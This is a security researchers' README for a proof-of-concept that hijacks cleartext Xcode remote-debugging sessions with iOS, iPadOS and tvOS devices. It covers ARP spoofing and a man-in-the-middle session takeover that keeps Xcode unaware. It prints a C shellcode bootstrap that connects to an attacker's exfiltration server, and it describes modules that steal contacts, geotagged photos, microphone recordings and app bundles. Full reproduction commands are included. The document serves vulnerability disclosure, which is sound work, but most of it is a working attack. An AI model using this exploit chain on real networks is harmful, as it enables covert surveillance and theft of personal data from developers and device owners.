# c0ntextomy
> an informal fallacy and a type of false attribution in which a passage is removed from its surrounding matter in such a way as to distort its intended meaning

Wikipedia - [Contextomy](https://en.wikipedia.org/wiki/Quoting_out_of_context)

A Proof of Concept demonstrating the vulnerability with a debug session hijack, remote code execution, and sensitive data exfiltration.

## Advisory
A design flaw in macOS'/Xcode's MobileDevice.framework and the Development Tools for iOS/iPadOS/tvOS results in clear text communication over the network, despite the service connection setup performing an actual SSL handshake.

For further details about the vulnerability, the affected components and versions refer to `advisory.md`.

## Authors
- Dany Lisiansky ([@danyl931](https://twitter.com/DanyL931)), Independent Security Researcher
- Nikias Bassen ([@pimskeks](https://twitter.com/pimskeks)), Security Researcher and VP of Product Security, ZIMPERIUM zLabs

## Exploitation
So we have plain-text remote debugging sessions over the network, how can we exploit this?

In theory, it would be enough to manipulate a single packet to inject or replace a shellcode sent and executed by different lldb operations (see symbol lookup as an example). While this is an impressive goal to meet, it would require us to specially craft and produce device/state dependent shellcodes in real-time which would make it difficult for others to reproduce in different environments. Instead, we opted to a more reliable, device/state agnostic and easily reproducible approach allowing us to attach a second, fully working lldb client to the process while keeping the original client unaware.

_Note that we were mostly focused on gaining code execution on the device side - but it's possible to attack the client as well. In fact, we accidentally crashed the client more than once during the implementation of this attack._

We also tried to simulate a real-world environment - an intruded local network inside an enterprise or a small startup which develops an AR/Fitness themed app, an app that communicates with an accessory attached via the lightning port or a tvOS app - all remotely debugged.

### Gaining control over the session
One option we first considered was to spoof mDNS records which are broadcasted by network devices to allow service discovery. We decided against it because mDNS records are likely to be cached and it might be difficult to change them after the fact. Instead, we went with an [ARP spoofing attack](https://en.wikipedia.org/wiki/ARP_spoofing) - a classic method that abuses the [Address Resolution Protocol](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) to associate IPv4 addresses with a MAC address of a machine we control and allowed us to redirect all victims' traffic through that machine.

_Note: While this specifically targets IPv4 networks, it is possible to use other kinds of attacks to target IPv6 networks as well (e.g. by attacking the NDP protocol or by propagating from other network positions). We used this method because it can also be easily delivered by publicly available tools and reproduced by others._

Next, we need to perform an active Man-in-the-Middle (MITM) attack and gain control over the session itself - this is usually done by registering a simple firewall redirection rule to redirect traffic from a known destination address and port to a server the attacker controls. Unfortunately, the destination port of debugserver is unknown since it is dynamically allocated and sent by lockdownd through a (properly) secured connection. Because we couldn't predict the port, we ended up writing an "on-demand" service to dynamically register firewall rules and spawn servers based on TCP SYN packets sent from our victims to each other and gained control over **all** TCP sessions. (_For implementation details refer to the NFQUEUE callback function `OnPacket` found in `/c0ntextomy/src/exploit/exploit.go`_)

### Detecting a `gdb-remote` session
At this point we reliably gained control over all TCP sessions between our victims, but how can we distinguish between a `gdb-remote` session and others? Thankfully the protocol defines an easy to identify handshake which initializes the session (as can be seen below) and followed by additional packets that exchange information about the supported server/client features, negotiating compression methods, the remote architecture, and general information about the process being debugged.

```
Client -> Server: $QStartNoAckMode#b0
Server -> Client: +$OK#9a
Client -> Server: +
Client -> Server: $qSupported:xmlRegisters=i386,arm,mips#12
Server -> Client: $NqXfer:features:read+;PacketSize=20000;qEcho+;SupportedCompressions=lzfse,zlib-deflate,lz4,lzma;DefaultCompressionMinSize=384#00
Client -> Server: $QEnableCompression:type:lzfse;#bf
...
```

### The right point in time to manipulate the session
The session is now in the initialization phase, the client sends various configuration packets, sets internal breakpoints, and so on. If we will try to manipulate it at this stage we are likely to break the session and make the victim notice. So how can we make sure the session is fully initialized? The same way Xcode does. During initialization Xcode enables the async process profiling feature by sending the following packet:

```
Client -> Server: $QSetEnableAsyncProfiling;enable:1;interval_usec:1000000;scan_type:0xfffffbff;#fd
Server -> Client: $OK#00
```
  
This configures debugserver to periodically send `profiling` packets (as seen below) and utilized by Xcode to present telemetry information about system resources used by the process.

```
Server -> Client: $Anum_cpu:2;host_user_ticks:92538;host_sys_ticks:0;host_idle_ticks:685745;elapsed_usec:1583325511341698;task_used_usec:0;thread_used_id:3c1e;thread_used_usec:323080;thread_used_name:;thread_used_id:3ceb;thread_used_usec:1753;thread_used_name:;thread_used_id:3cec;thread_used_usec:2464;thread_used_name:;thread_used_id:3ced;thread_used_usec:139;thread_used_name:;thread_used_id:3cee;thread_used_usec:67;thread_used_name:;thread_used_id:3cef;thread_used_usec:2798;thread_used_name:636f6d2e6170706c652e75696b69742
```

When Xcode receives the first `profiling` packet it considers the process as running, presents the debugging UI, and allows the user to manually interrupt it.

### Preparing the session for a second client whilst keeping the original client unaware
Now that we found the right point in time for the session takeover we need to prepare the session to accept a second client. First, we wait for the profiling packet to arrive and save it so we could send it back later on. Next, we send a `process interrupt` packet (with the value of `\x03` - surprisingly equivalent to the `SIGQUIT` signal) to stop the process. This is important because when lldb tries to connect it expects the process to be stopped. However, the process interruption itself sends state packets back to the client. Since we want the original client to be unaware of the hijack we separate it from the session and instead start replaying the profiling packet we saved earlier back to the original client.

Once debugserver finished sending all state packets the session is ready to accept a second client, almost.

### Attacker joins the party
We are in control of the session, the process is now stopped, and everything is supposed to be ready. But how do we join a second client?

Our first attempt was to spawn a server, use the `gdb-remote HOST:PORT` command to connect the second client, and start forwarding the packets straight to debugserver. Unfortunately, the new client was unaware of the already initialized session and tried to perform a handshake. Because debugserver was already initialized it simply ignored our new client and it failed to connect.

```
(lldb) gdb-remote HOST:PORT
error: failed to get reply to handshake packet
```

On the second attempt we waited for the new client to perform the handshake, but instead of forwarding the packets straight to debugserver we first manually handled the handshake by sending the expected replies back to the client. This time we were greeted with the familiar lldb shell. But does it work? Yes, yes it does.

```
(lldb) gdb-remote HOST:PORT
(lldb) th ba
* thread #1, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP
  * frame #0: 0x00000001896bb5f4 libsystem_kernel.dylib`mach_msg_trap + 8
    frame #1: 0x00000001896baa60 libsystem_kernel.dylib`mach_msg + 72
    frame #2: 0x0000000189862068 CoreFoundation`__CFRunLoopServiceMachPort + 216
    frame #3: 0x000000018985d188 CoreFoundation`__CFRunLoopRun + 1444
    frame #4: 0x000000018985c8bc CoreFoundation`CFRunLoopRunSpecific + 464
    frame #5: 0x00000001936c8328 GraphicsServices`GSEventRunModal + 104
    frame #6: 0x000000018d8f26d4 UIKitCore`UIApplicationMain + 1936
    frame #7: 0x000000010008e2e4 project`main + 132
    frame #8: 0x00000001896e7460 libdyld.dylib`start + 4
```

At this stage, we have a full session takeover in place, and basically just pipe packets between debugserver and the new client. For each packet forwarded to debugserver, we also send back the saved profiling packet to the original client to keep it happy. At the same time we ignore all packets coming from the original client.

### A more practical way to join a second client
On our previous attempt, we spawned a server and manually connected a new client using the `gdb-remote HOST:PORT` command. While it works, it also makes it considerably difficult to handle. Since we already know Xcode passes a raw socket to the `lldb-rpc-server` process we knew there is a more practical way to achieve this. After digging deeper we learned that `gdb-remote` was implemented as a `process connect` plugin and indeed supports an additional option that accepts file descriptors. It is possible to access this option both through lldb's API (using the `ConnectRemote` method of the class `SBTarget`) and also straight from the interactive shell using the `process connect -p gdb-remote fd://` command.

This allowed us to simplify our design and implement a reverse-lldb-client server that accepts connections and passes the sockets straight to lldb. As a matter of fact, we implemented 3 of them:

1. `c0ntextomy-lldb-shell` - A server implemented in c which accepts a single connection and drops to an interactive lldb shell.
2. `c0ntextomy-lldb-ipython.py` - A server implemented in python which accepts a single connection and drops to an interactive ipython session (was mostly used for development).
3. `rec0ntextualizer.py` - Our post-exploitation PoC which demonstrates data exfiltration capabilities and described in detail in the next section.

### Cleanly disconnecting the second client and rejoining the original client to the session
So far we successfully joined a second client to the session and deceived the original client to ensure it doesn't notice the session was hijacked. Now we also want to be able to cleanly bring the session back into the hands of the original client when the second client disconnects.

Because lldb sets internal breakpoints, allocates memory pages and so on, the second client may affect the state of the session and cause the original client to encounter unexpected behavior from debugserver. But how can we make sure the second client leaves the session cleanly? Thankfully lldb implements a `detach` command which takes care of any leftovers lldb may leave behind. This command is implemented in 3 phases, the first phase ensures the process is stopped and otherwise sends a `process interrupt` packet, the next phase performs the cleanup and finally, the third phase tells debugserver to detach and exit. This is not exactly what we want, however since we have full control over the session we can monitor for the last phase and at that point separate the second client from the session, effectively preventing it from detaching and killing debugserver. To make sure the second client is happy we also reply with the expected packet.

```
...
Attacker -> c0ntextomy: $D#44   // A detach packet which never arrives to debugserver
c0ntextomy -> Attacker: $OK#00  // A reply to keep the second client happy
```

Now the session is clean, but we are left with a stopped process. To resume it we simply send a `process continue` packet to debugserver.

```
c0ntextomy -> Server: $c#63
```

At last, we are ready to rejoin the original client back to the session. We stop replaying the saved profiling packet and start piping packets back between debugserver and to the original client.

## Post-exploitation PoC: `rec0ntextualizer`
> **Recontextualisation** is a process that extracts text, signs or meaning from its original context (decontextualisation) and reuses it in another context.

Wikipedia - [Recontextualisation](https://en.wikipedia.org/wiki/Recontextualisation)

`rec0ntextualizer` is our post-exploitation PoC that gains remote code execution on the victim's device through the hijacked debugging session to exfiltrate sensitive user data. It spawns two servers that help in facilitating this:

* reverse-lldb-server
  Starts `lldb` and listens for an incoming connection from the exploit handling code (see `ConnectToReverseLLDBServer` in `/c0ntextomy/src/exploit/exploit.go`) which in turn makes it connect `lldb` back to the running debugserver through the hijacked debugging session by using the `gdb-remote fd://` method described in the previous section. Once attached, it will bootstrap the debugged process to prepare it for loading a payload that will handle the exfiltration.
* exfiltration-server
  Listens for connections from the bootstrapping shellcode. Once connected it will serve an initial shellcode payload that - through additional payloads - handles the exfiltration, and receives the exfiltrated data back, storing them in an `artifacts` directory.

The bootstrapping, payload injection, and payload execution are outlined in the following chapter.

### Payload injection and gaining persistence
Since the exploit gives us full control over the debugged process, we can do whatever we want with it. To facilitate easy and reliable data exfiltration, we inject a payload that will also allow us to gain persistence and leave the hijacked session quickly.

Using lldb's `expression` feature we bootstrap the debugged process with a few lines of code that `lldb` will translate into shellcode for us. The following listing shows the (commented) expression template we are sending through the hijacked session. `PORT_NUMBER`, `IP_ADDRESS`, `PTRAUTH_SIGN_UNAUTHENTICATED_FUNC`, `ARCH`, and `SESSION_ID` will be dynamically assigned before passing it through the attacking `lldb` client.

_Note: on arm64e CPUs (A12 SoCs and up) there is a control-flow mitigation, also known as PAC which requires us to sign pointers. This is done by dynamically assigning the `PTRAUTH_SIGN_UNAUTHENTICATED_FUNC` macro on PAC enabled SoCs and use the standard signing facilities to sign a pointer to our payload._

```
// A template populated by rec0ntextulizer,
// compiled into shellcode and executed
// using lldb's expression evaluator

// Expanded at load time for all sessions
#define PORT_NUMBER {PORT_NUMBER}
#define IP_ADDRESS "{IP_ADDRESS}"

// Device/session specific configuration, expanded right before evaluation
#define PTRAUTH_SIGN_UNAUTHENTICATED_FUNC(p) {{PAC_SIGN_FUNC}}
#define ARCH "{{ARCH}}"
#define SESSION_ID "{{SESSION_ID}}"


// connect to exfiltration server
int fd = socket(AF_INET, SOCK_STREAM, 0);
sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT_NUMBER);
addr.sin_addr.s_addr = inet_addr(IP_ADDRESS);
connect(fd, (struct sockaddr *)&addr, sizeof(sockaddr_in));

// send arch type
send(fd, ARCH, sizeof(ARCH) - 1, 0);

// receive payload size
uint64_t len = 0;
recv(fd, &len, sizeof(uint64_t), MSG_WAITALL);

// allocate buffer for payload
void *payload = NULL;
mach_port_t task = mach_task_self();
size_t size = ((mach_vm_offset_t)(len) + vm_page_mask) & ~((signed)vm_page_mask);
vm_allocate(task, (vm_address_t *)&payload, size, VM_FLAGS_ANYWHERE);

// receive payload and write it to the allocated buffer
recv(fd, payload, len, MSG_WAITALL);

// set payload memory mapping as r^x
vm_protect(task, (vm_address_t)payload, size, 0, VM_PROT_READ | VM_PROT_EXECUTE);

// prepare args
void **args = (void **)malloc(sizeof(void *) * 5);
args[0] = (void *)payload;
args[1] = (void *)fd;
args[2] = (void *)strdup(SESSION_ID);
args[3] = (void *)dlopen;
args[4] = (void *)dlsym;

// execute payload in a new thread
void *(*payload_entry)(void *) = (void *(*)(void *))PTRAUTH_SIGN_UNAUTHENTICATED_FUNC(payload);
pthread_t thread;
pthread_create(&thread, NULL, payload_entry, args);

```

The code above will make the process connect to the `exfiltration-server`, receive the prepared shellcode payload from it, put it into a newly-allocate memory page, and then execute it in a new thread which will effectively make it persistent for as long as the debugged process is running.

### Process continuation and payload execution
In order to trigger the execution of the received payload shellcode in a new thread, we have to continue the execution of the debugged process first. As described in the previous section, the exploit - which is currently proxying the attacker-debugserver packets - is monitoring for a `detach` packet coming from the attacker. Once it receives it, without forwarding the actual detach to debugserver, it will send a simple `OK` packet back to the attacking `lldb` client and then send a `continue` packet to debugserver which will continue execution of the debugged process, and resume the original session.

From the victim's point of view, this is practically not noticeable and Xcode will happily continue the debugging session as if nothing has happened, but with the difference that our new thread will now start executing the payload.

Once the payload shellcode executes it will fetch additional 'modules' from the `exfiltration-server` that will then perform the exfiltration of different categories of sensitive user data. Modules consist of precompiled code that will be mapped to memory, made executable, and then executed in the context of the debugged process, while on the client side a python companion handles receiving the exfiltrated data through the `exfiltration-server`.

### Payload modules
We created a few modules that demonstrate the extraction capabilities.

#### `helloworld`
This is a sample module. All it does is print `Hello world!` to stdout. This is intended to serve as a template for additional modules.

#### `get_app`
This module creates a ZIP archive of the entire app bundle of the debugged process and transfers it over. The bundle will contain the mobileprovision profile which includes the developers' name, team, organization, and the UDIDs of all associated devices.

#### `get_audio`
This module tries to create a 5-second recording through the device's microphone and transfers the recording over as an m4a file.

#### `get_contacts`
This module tries to get all contacts from the device and transfers them over as vcards data.

#### `get_photos`
This module tries to extract the last 10 photos from the device and transfers them over one by one. The photos will contain full metadata, including geolocation (if the location was available when the victim took them).

#### `you_got_pwned`
This module uses the speech synthesis API to have the device say "You have been pwned!". This does not exfiltrate any data but serves as an example of what other kinds of shenanigans are possible.

## Reproducing
In this section, we will go through the required steps to set up the test environment and reproduce the same results we were able to achieve.

### Environment
Our test environment consists of 4 machines on the same local network. To simplify the instructions we will define a name for each machine to be used throughout this section.

1. __Attacker #0__ - A Linux machine connected physically to the local network which runs the exploit component.
2. __Attacker #1__ - A macOS machine on the local network which runs the post-exploitation component.
3. __Victim #0__ - A macOS machine on the local network runs Xcode which remotely debugs an app on __Victim #1__.
4. __Victim #1__ - An iOS/iPadOS/tvOS device on the local network which runs an app debugged by __Victim #0__.

### Setup
* __Attacker #0__
  * Install `Bettercap` - [instructions](https://github.com/bettercap/bettercap)
  * Configure a higher limit for open files by executing the following command:
    * `sudo ulimit -n 1000000`
  * Copy the contents of `/c0ntextomy/src/exploit` to the root dir of `Bettercap`.
  * From the root dir of `Bettercap`, compile the exploit by executing the following command:
    *  `go build -buildmode=plugin exploit.go`
  *  Still in the root dir of `Bettercap`, edit the file `exploit.cap` and replace the following placeholders to match your configuration:
    *  `<REVERSE_LLDB_SERVER_IP>` - The IP address of __Attacker #1__
    *  `<VICTIM#0_IP>` - The IP address of __Victim #0__
    *  `<VICTIM#1_IP>` - The IP address of __Victim #1__
* __Attacker #1__
  * Make sure Xcode and the command-line tools are installed.
  * From `/c0ntextomy`, compile the project by executing the following command:
    * `make`
* __Victim #0__
  * Disable IPv6 by executing one of the following commands (depending on the interface used to connect to the network):
    * For Wi-Fi: `sudo networksetup -setv6off Wi-Fi`
    * For Ethernet: `sudo networksetup -setv6off Ethernet`
  * Enable remote debugging for __Victim #1__
    * Make sure a lock screen password is set
    * Connect the device to the machine using USB
    * In Xcode, open the `Devices and Simulators` window from the top `Window` menu or by using the following keyboard shortcut:
      * `cmd` + `Shift` + `2`
    * Select your device on the left menu
    * Enable the `Connect via network` option
    * Disconnect the device and make sure a little globe appeared next to the name of the device in Xcode
    * Verify that you are able to debug an app remotely by selecting the device as a target and running an app from Xcode

### Running
* __Attacker #0__
  * Ping both __Victim #0__ and __Victim #1__ to make sure the current ARP entries are correct.
  * From the root dir of `Bettercap` execute the following command:
    * `bettercap -gateway-override <GATEWAY_IP_ADDRESS> -iface <INTERFACE> -caplet exploit.cap`
      * Replace `<GATEWAY_IP_ADDRESS>` with the IP address of your gateway (usually the address of the router that manages your local network)
      * Replace `<INTERFACE>` with the interface used to physically connect the machine to the network
* __Attacker #1__
  * From `/c0ntextomy`, execute one of the following reverse-lldb-client servers:
    * `./c0ntextomy-lldb-shell <INTERFACE>` - Drops to a normal lldb shell connected to the hijacked session
    * `./c0ntextomy-lldb-ipython.py -i <INTERFACE>` - Drops to an ipython shell with connected to the hijacked session _(Note: ipython needs to be installed separately)_
    * `./rec0ntextualizer.py -i <INTERFACE>` - Our post-exploitation PoC which exfiltrates sensitive user data using the hijacked session.
* __Victim #0__
  * Open an Xcode project
  * Select the remote device (__Victim #1__) as a destination target
  * Run the project by hitting the play button or by using the following keyboard shortcut:
    * `cmd` + `r`

## References
* [bettercap](https://github.com/bettercap/bettercap) - The Swiss Army knife for 802.11, BLE and Ethernet networks reconnaissance and MITM attacks. (thanks [@evilsocket](https://twitter.com/evilsocket))
* [tools/vmacho](https://github.com/Siguza/misc/blob/master/vmacho.c) - Extracts a Mach-O into a raw, headless binary. (thanks [@s1guza](https://twitter.com/s1guza))
